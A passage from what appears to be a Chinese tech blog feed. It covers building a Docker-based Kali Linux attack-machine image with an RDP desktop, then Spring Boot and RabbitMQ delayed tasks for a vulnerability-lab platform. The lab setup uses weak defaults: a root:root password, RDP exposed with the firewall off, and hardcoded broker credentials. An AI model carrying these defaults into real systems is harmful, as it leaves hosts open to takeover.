    <span class="hljs-attribute">gateway</span>=<span class="hljs-string">&#x27;192.168.52.254&#x27;</span>
)
ipam_config = docker.types.IPAMConfig(
    pool_configs=[ipam_pool]
)

client.networks.create(
    <span class="hljs-string">&quot;network1&quot;</span>,
    <span class="hljs-attribute">driver</span>=<span class="hljs-string">&quot;bridge&quot;</span>,
    <span class="hljs-attribute">ipam</span>=ipam_config
)</code></pre>



<h1 id="创建kali攻击机镜像"><a href="#创建kali攻击机镜像" class="headerlink" title="创建kali攻击机镜像"></a>创建kali攻击机镜像</h1><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><pre><code class="hljs bash">docker pull kalilinux/kali-rolling</code></pre>

<p>查看下载的镜像</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span></code></pre>

<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -itd -p 3399:3389 kalilinux/kali-rolling /bin/bash</span></code></pre>

<p>查看容器id</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span></code></pre>

<p>进入容器</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>

<h2 id="安装基础环境包"><a href="#安装基础环境包" class="headerlink" title="安装基础环境包"></a>安装基础环境包</h2><p>❗需要关闭防火墙或者打开3399端口，否则无法连接</p>
<p>首先安装vim</p>
<pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> -y update &amp;&amp; apt-<span class="hljs-built_in">get</span> -y<span class="hljs-built_in"> upgrade</span>
<span class="hljs-built_in"></span>apt-<span class="hljs-built_in">get</span> update --fix-missing	
apt-<span class="hljs-built_in">get</span> install vim</code></pre>

<p>修改镜像源</p>
<pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>apt/sources.list

添加内容
deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre>

<p>安装基础环境包</p>
<pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> -y update &amp;&amp; apt-<span class="hljs-built_in">get</span> -y<span class="hljs-built_in"> upgrade </span>&amp;&amp; \
   <span class="hljs-attribute">DEBIAN_FRONTEND</span>=noninteractive apt-<span class="hljs-built_in">get</span> install -y \
   kali-tools-top10 \
   pciutils \
   iputils-ping \
   bash-completion &amp;&amp; \
   apt-<span class="hljs-built_in">get</span> autoremove -y &amp;&amp; \
   apt-<span class="hljs-built_in">get</span> clean</code></pre>

<h2 id="生成新镜像"><a href="#生成新镜像" class="headerlink" title="生成新镜像"></a>生成新镜像</h2><p>待上面的所有程序安装完成后，打包生成新镜像</p>
<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit f16618e0fda5 kali-<span class="hljs-number">2021</span></code></pre>



<h2 id="远程桌面环境安装"><a href="#远程桌面环境安装" class="headerlink" title="远程桌面环境安装"></a>远程桌面环境安装</h2><h3 id="使用新镜像启动容器"><a href="#使用新镜像启动容器" class="headerlink" title="使用新镜像启动容器"></a>使用新镜像启动容器</h3><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-<span class="hljs-number">2021</span></code></pre>

<p>进入镜像</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>

<h3 id="安装桌面服务"><a href="#安装桌面服务" class="headerlink" title="安装桌面服务"></a>安装桌面服务</h3><p><strong>●</strong> kali-desktop-xfce ：安装远程桌面环境</p>
<p><strong>●</strong> xrdp ：远程桌面服务</p>
<p><strong>●</strong> xorg：xorg是x11的一个实现，xorg提供X server</p>
<pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update

apt-<span class="hljs-built_in">get</span> -y install kali-desktop-xfce xorg xrdp</code></pre>

<p>配置xrdp实现远程连接图形界面：</p>
<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
service xrdp restart</code></pre>

<p>修改root用户密码：</p>
<pre><code class="hljs vim">passwd root


<span class="hljs-keyword">echo</span> roo<span class="hljs-variable">t:root</span>|chpasswd</code></pre>

<p>再次登录XRDP：</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220304155750507.png" alt="image-20220304155750507"></p>
<h3 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h3><pre><code class="hljs applescript">docker commit <span class="hljs-built_in">id</span> docker-attack</code></pre>

<h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>因为启动容器后需要运行</p>
<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
service xrdp restart</code></pre>

<p>所有使用Dockerfile完成这两步操作</p>
<pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> kali-attack:latest
<span class="hljs-keyword">COPY</span><span class="language-bash"> run.sh /home/run.sh</span>
<span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /home/run.sh</span>
<span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;</span>]</span></code></pre>

<p> 没有<code>tail -f /dev/null</code>会导致启动容器后自动退出无法使用，<a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">原因</a>可能如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220305103247695.png" alt="image-20220305103247695"></p>
<p><code>run.sh</code>中的内容，为启动容器后需要执行的两条命令</p>
<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>

sed -i <span class="hljs-string">&#x27;s/port=3399/port=3389/g&#x27;</span> /etc/xrdp/xrdp.ini
<span class="hljs-built_in">wait</span>
service xrdp restart</code></pre>

<p>使用</p>
<pre><code class="hljs erlang">docker build -t kali-attack2 .</code></pre>

<p>创建镜像，之后创建容器</p>
<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-attack2</code></pre>

<p>这样就可以直接使用mstvc.exe连接kali桌面</p>
<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>root
<span class="hljs-symbol">password:</span>root</code></pre>



<h1 id="docker访问宿主机网络资源"><a href="#docker访问宿主机网络资源" class="headerlink" title="docker访问宿主机网络资源"></a>docker访问宿主机网络资源</h1><p><a href="https://swiftflamel.com/2021/04/01/docker-container%E5%AE%B9%E5%99%A8%E5%86%85%E8%AE%BF%E9%97%AE%E5%AE%BF%E4%B8%BB%E6%9C%BAhost%E6%9C%8D%E5%8A%A1/">解决方案</a></p>
<p>本文使用的的windows docker版本大于18.03可以直接使用<code>host.docker.internal</code>访问宿主机网络资源</p>
<p>其他操作系统的可以<a href="https://www.jianshu.com/p/4a358a120983">参考</a></p>
<h1 id="docker容器安装vim出错"><a href="#docker容器安装vim出错" class="headerlink" title="docker容器安装vim出错"></a>docker容器安装vim出错</h1><p>报错信息如下</p>
<pre><code class="hljs mipsasm">ncurses-<span class="hljs-keyword">base </span>: <span class="hljs-keyword">Breaks: </span>libtinfo5 (&lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>) <span class="hljs-keyword">but </span><span class="hljs-number">6</span>.<span class="hljs-number">0</span>+<span class="hljs-number">20161126</span><span class="hljs-number">-1</span>+deb9u2 is to <span class="hljs-keyword">be </span><span class="hljs-keyword">installed</span>
<span class="hljs-keyword"></span>E: Error, pkgProblemResolver::Resolve generated <span class="hljs-keyword">breaks, </span>this may <span class="hljs-keyword">be </span>caused <span class="hljs-keyword">by </span>held packages.
E: Unable to correct dependencies</code></pre>

<p>直接使用apt安装此包即可</p>
<pre><code class="hljs vim">apt <span class="hljs-keyword">update</span>
apt upgrade
apt install <span class="hljs-keyword">vim</span></code></pre>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>delay_task</title>
    <url>/2023/04/13/delay-task/</url>
    <content><![CDATA[<h1 id="在Springboot中使用RabbitMQ实现倒计时执行任务"><a href="#在Springboot中使用RabbitMQ实现倒计时执行任务" class="headerlink" title="在Springboot中使用RabbitMQ实现倒计时执行任务"></a>在Springboot中使用RabbitMQ实现倒计时执行任务</h1><p> <code>死信</code>顾名思义，就是死掉的信息，英文是Dead Letter。<code>死信交换机（Dead-Letter-Exchange）</code>和普通交换机没有区别，都是可以接受信息并转发到与之绑定并能路由到的队列，区别在于<code>死信交换机</code>是转发<code>死信</code>的，而和该<code>死信交换机</code>绑定的队列就是<code>死信队列</code>。说的再通俗一点，死信交换机和死信队列其实都只是普通的交换机和队列，只不过接受、转发的信息是<code>死信</code>，其他操作并没有区别。</p>
<h2 id="1-配置RabbitMQ"><a href="#1-配置RabbitMQ" class="headerlink" title="1.配置RabbitMQ"></a>1.配置RabbitMQ</h2><h3 id="1-1-创建交换机"><a href="#1-1-创建交换机" class="headerlink" title="1.1 创建交换机"></a>1.1 创建交换机</h3><p>交换机的存在可以将生产者发送的消息，路由到不同的queue</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413095908823.png" alt="image-20230413095908823"></p>
<h3 id="1-2-创建死信队列"><a href="#1-2-创建死信队列" class="headerlink" title="1.2 创建死信队列"></a>1.2 创建死信队列</h3><ul>
<li>x-message-ttl: 消息的存活时间，单位是ms</li>
<li>x-dead-letter-exchange: 指定死信队列的交换机为之前创建的delay_exchange</li>
<li>x-dead-letter-routing-key:  当消息过期之后转发到交换机key(k2)对应的队列queue</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413100411042.png" alt="image-20230413100411042"></p>
<h3 id="1-3-创建普通队列"><a href="#1-3-创建普通队列" class="headerlink" title="1.3 创建普通队列"></a>1.3 创建普通队列</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413153741198.png" alt="image-20230413153741198"></p>
<h3 id="1-4-绑定交换机和队列"><a href="#1-4-绑定交换机和队列" class="headerlink" title="1.4 绑定交换机和队列"></a>1.4 绑定交换机和队列</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413100759703.png" alt="image-20230413100759703"></p>
<h3 id="1-5-代码实现"><a href="#1-5-代码实现" class="headerlink" title="1.5 代码实现"></a>1.5 代码实现</h3><p>以上步骤也能使用代码实现</p>
<h2 id="2-springboot整合RabbitMQ"><a href="#2-springboot整合RabbitMQ" class="headerlink" title="2 springboot整合RabbitMQ"></a>2 springboot整合RabbitMQ</h2><h3 id="2-1导入依赖"><a href="#2-1导入依赖" class="headerlink" title="2.1导入依赖"></a>2.1导入依赖</h3><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--raabbitmq客户端--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>



<h3 id="2-2-添加配置"><a href="#2-2-添加配置" class="headerlink" title="2.2 添加配置"></a>2.2 添加配置</h3><pre><code class="hljs yaml"><span class="hljs-attr">rabbitmq:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span>
  <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
  <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
  <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">host1</span>
  <span class="hljs-attr">listener:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">simple</span>
    <span class="hljs-attr">simple:</span>
      <span class="hljs-attr">default-requeue-rejected:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># 消息被拒绝</span>
      <span class="hljs-attr">acknowledge-mode:</span> <span class="hljs-string">manual</span>		<span class="hljs-comment"># 手动确认消息</span></code></pre>



<h3 id="2-3-创建交换机、队列并绑定"><a href="#2-3-创建交换机、队列并绑定" class="headerlink" title="2.3 创建交换机、队列并绑定"></a>2.3 创建交换机、队列并绑定</h3><p>第一节的实现，也可以使用代码实现</p>
<p>队列名、交换机名与key</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitConstants</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DLX_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delay_exchange&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DLX_ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;k1&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DLX_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delay_queue1&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delay_queue2&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;k2&quot;</span>;
&#125;</code></pre>



<pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sunzy.vulfocus.common.RabbitConstants;
<span class="hljs-keyword">import</span> org.springframework.amqp.core.*;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-comment">//@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitConfig</span> &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 死信队列</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Queue&#125;</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">Queue1</span><span class="hljs-params">()</span> &#123;
        Map&lt;String, Object&gt; argments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        argments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>, <span class="hljs-number">60000</span>);<span class="hljs-comment">// 一分钟的延时</span>
        argments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>, RabbitConstants.DLX_EXCHANGE);
        argments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>, RabbitConstants.ROUTING_KEY);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(RabbitConstants.DLX_QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, argments);
    &#125;


    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">Queue2</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(RabbitConstants.QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 交换机</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Exchange&#125;</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Exchange <span class="hljs-title function_">orderExchange</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(RabbitConstants.DLX_EXCHANGE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 路由键</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Binding&#125;</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">Routing</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> BindingBuilder.bind(Queue2()).to(orderExchange()).with(RabbitConstants.ROUTING_KEY).noargs();
    &#125;


    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 死信路由键</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Binding&#125;</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">DlxRouting</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> BindingBuilder.bind(Queue1()).to(orderExchange()).with(RabbitConstants.DLX_ROUTING_KEY).noargs();
    &#125;
&#125;
</code></pre>

<h3 id="2-4-测试代码"><a href="#2-4-测试代码" class="headerlink" title="2.4 测试代码"></a>2.4 测试代码</h3><p>生产者向交换机<code>delay_exchange</code>发送消息，并且key为k1，交换机接收消息后，会将该消息路由到<code>delay_queue1</code>，该消息会在死信队列中待60s后，转发到<code>delay_queue2</code>中</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testSendAmqp</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">String</span> <span class="hljs-variable">taskId</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cfdf21cd13f248d3885ec47329bbb3bf&quot;</span>;
    amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE,
            RabbitConstants.DLX_ROUTING_KEY,
            taskId);
    System.out.println(<span class="hljs-string">&quot;发送时间：&quot;</span> + LocalDateTime.now());
    System.out.println(<span class="hljs-string">&quot;send message success&quot;</span>);
&#125;</code></pre>

<p>消费者这边监听<code>delay_queue2</code>中的消息</p>
<pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(queues = RabbitConstants.QUEUE, ackMode = &quot;MANUAL&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getMessage</span><span class="hljs-params">(Message message, Channel channel)</span> <span class="hljs-keyword">throws</span> IOException &#123;
    System.out.println(<span class="hljs-string">&quot;接收死信队列传递的消息...&quot;</span>);
    System.out.println(<span class="hljs-string">&quot;时间：&quot;</span> + LocalDateTime.now());
    <span class="hljs-type">String</span> <span class="hljs-variable">taskId</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());
    System.out.println(taskId);
    channel.basicAck(message.getMessageProperties().getDeliveryTag(), <span class="hljs-literal">false</span>);
&#125;</code></pre>

<p>测试效果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413160512237.png" alt="image-20230413160512237"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413160457446.png" alt="image-20230413160457446"></p>
<p>从测试结果可以看出来，时间正好相差60s，已经实现了延时执行任务的操作。</p>
<h2 id="3-实现倒计时关闭docker容器"><a href="#3-实现倒计时关闭docker容器" class="headerlink" title="3 实现倒计时关闭docker容器"></a>3 实现倒计时关闭docker容器</h2><p>上面的延时消息的实现，主要服务于这个倒计时执行任务。</p>
<p>有了上面的实现，再实现倒计时关闭docker容器就简单很多</p>
<h3 id="3-1-启动容器"><a href="#3-1-启动容器" class="headerlink" title="3.1 启动容器"></a>3.1 启动容器</h3><p>首先在启动容器时，如果容器启动成功，此时需要创建一个关闭容器的任务，并将关闭容器的任务发送到死信队列中。</p>
<pre><code class="hljs java"><span class="hljs-meta">@Async</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runContainer</span><span class="hljs-params">(String containerId, UserDTO user, String taskId, <span class="hljs-type">int</span> countdown)</span> <span class="hljs-keyword">throws</span> Exception &#123;
    <span class="hljs-type">ContainerVul</span> <span class="hljs-variable">containerVul</span> <span class="hljs-operator">=</span> containerService.query().eq(<span class="hljs-string">&quot;container_id&quot;</span>, containerId).one();
    <span class="hljs-keyword">if</span> (containerVul == <span class="hljs-literal">null</span>) &#123;
        <span class="hljs-keyword">throw</span> ErrorClass.ContainerNotExistsException;
    &#125;
    <span class="hljs-type">String</span> <span class="hljs-variable">dockerContainerId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-type">UserUserprofile</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> userService.getById(user.getId());
    dockerContainerId = containerVul.getDockerContainerId();
    <span class="hljs-type">ImageInfo</span> <span class="hljs-variable">imageInfo</span> <span class="hljs-operator">=</span> imageService.query().eq(<span class="hljs-string">&quot;image_id&quot;</span>, containerVul.getImageIdId()).one();
    <span class="hljs-type">String</span> <span class="hljs-variable">imageName</span> <span class="hljs-operator">=</span> imageInfo.getImageName();
    <span class="hljs-type">String</span> <span class="hljs-variable">imagePort</span> <span class="hljs-operator">=</span> imageInfo.getImagePort();
    <span class="hljs-type">Integer</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> userInfo.getId();

    <span class="hljs-type">Result</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">         * 创建启动任务</span>
<span class="hljs-comment">         */</span>
    HashMap&lt;String, Object&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    args.put(<span class="hljs-string">&quot;imageName&quot;</span>, imageName);
    args.put(<span class="hljs-string">&quot;userId&quot;</span>, userId);
    args.put(<span class="hljs-string">&quot;imagePort&quot;</span>, imagePort);
    <span class="hljs-type">TaskInfo</span> <span class="hljs-variable">taskInfo</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;task_id&quot;</span>, taskId).one();
    <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-type">String</span> <span class="hljs-variable">vulFlag</span> <span class="hljs-operator">=</span> containerVul.getContainerFlag();
    <span class="hljs-type">String</span> <span class="hljs-variable">containerPort</span> <span class="hljs-operator">=</span> containerVul.getContainerPort();

    <span class="hljs-type">String</span> <span class="hljs-variable">vulPort</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">if</span> (containerVul.getVulPort() != <span class="hljs-literal">null</span>) &#123;
        vulPort = containerVul.getVulPort();
    &#125;
    <span class="hljs-type">String</span> <span class="hljs-variable">vulHost</span> <span class="hljs-operator">=</span> containerVul.getVulHost();
    <span class="hljs-type">Container</span> <span class="hljs-variable">container</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (!StrUtil.isBlank(dockerContainerId)) &#123;
        <span class="hljs-type">CheckResp</span> <span class="hljs-variable">checkResp</span> <span class="hljs-operator">=</span> checkContainer(dockerContainerId);
        <span class="hljs-keyword">if</span> (checkResp.isFlag()) &#123;
            container = checkResp.getContainer();
            vulFlag = containerVul.getContainerFlag();
        &#125;
    &#125;

    <span class="hljs-comment">// 容器被删除，此时要创建一个容器</span>
    <span class="hljs-keyword">if</span> (container == <span class="hljs-literal">null</span>) &#123;
        String[] portList = imagePort.split(<span class="hljs-string">&quot;,&quot;</span>);
        ArrayList&lt;String&gt; randomList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        HashMap&lt;String, Integer&gt; portDict = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (String port : portList) &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">randomPort</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;
                randomPort = DockerTools.getRandomPort();
                <span class="hljs-keyword">if</span> (randomList.contains(randomPort) || containerService.query().eq(<span class="hljs-string">&quot;container_port&quot;</span>, randomPort).one() != <span class="hljs-literal">null</span>) &#123;
                    <span class="hljs-keyword">continue</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
            &#125;
            <span class="hljs-keyword">if</span> (StrUtil.isBlank(randomPort)) &#123;
                msg = Result.fail(<span class="hljs-string">&quot;端口无效&quot;</span>);
                <span class="hljs-keyword">break</span>;
            &#125;
            randomList.add(randomPort);
            portDict.put(port + <span class="hljs-string">&quot;/tcp&quot;</span>, Integer.valueOf(randomPort));
        &#125;
        <span class="hljs-comment">// 端口重复无法创建</span>
        <span class="hljs-keyword">if</span> (msg != <span class="hljs-literal">null</span>) &#123;
            taskInfo.setTaskMsg(JSON.toJSONString(msg));
            taskInfo.setUpdateDate(LocalDateTime.now());
            taskInfo.setTaskStatus(<span class="hljs-number">4</span>);
            save(taskInfo);
            <span class="hljs-comment">//                return taskInfo.getTaskId();</span>
        &#125;
        <span class="hljs-comment">// 记录端口映射</span>
        <span class="hljs-comment">// &#123;&quot;3306&quot;: &quot;24471&quot;, &quot;80&quot;: &quot;29729&quot;&#125;</span>
        <span class="hljs-comment">// &#123;&quot;3306&quot;:&quot;22113&quot;,&quot;8080&quot;:&quot;12345&quot;&#125;</span>
        vulPort = JSON.toJSONString(portDict);
        HashMap&lt;String, Integer&gt; vulPorts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        Set&lt;Map.Entry&lt;String, Integer&gt;&gt; entries = portDict.entrySet();
        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : entries) &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> entry.getKey().split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>];
            <span class="hljs-type">Integer</span> <span class="hljs-variable">tmpRandomPort</span> <span class="hljs-operator">=</span> entry.getValue();
            vulPorts.put(port, tmpRandomPort);
        &#125;
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-comment">// 只创建不启动</span>
            dockerContainerId = DockerTools.runContainerWithPorts(imageName, vulPorts);
            container = DockerTools.getContainerById(dockerContainerId);
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            <span class="hljs-comment">// 修改任务状态</span>
            msg = Result.build(<span class="hljs-string">&quot;镜像不存在&quot;</span>, <span class="hljs-literal">null</span>);
            taskInfo.setTaskMsg(JSON.toJSONString(msg));
            taskInfo.setUpdateDate(LocalDateTime.now());
            taskInfo.setTaskStatus(<span class="hljs-number">4</span>);
            save(taskInfo);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        &#125;
        vulFlag = <span class="hljs-string">&quot;flag&#123;&quot;</span> + UUID.randomUUID().toString() + <span class="hljs-string">&quot;&#125;&quot;</span>;
        <span class="hljs-keyword">if</span> (!StrUtil.isBlank(containerVul.getContainerFlag())) &#123;
            vulFlag = containerVul.getContainerFlag();
        &#125;
        command = <span class="hljs-string">&quot;touch /tmp/&quot;</span> + vulFlag;
        vulHost = DockerTools.getLocalIp();
    &#125;   <span class="hljs-comment">// 容器存在</span>
    <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">taskStartDate</span> <span class="hljs-operator">=</span> LocalDateTime.now();
    <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">taskEndDate</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (countdown &gt;= <span class="hljs-number">60</span>) &#123;
        taskEndDate = taskStartDate.plusSeconds(countdown);
    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (countdown == <span class="hljs-number">0</span>) &#123;

    &#125; <span class="hljs-keyword">else</span> &#123;
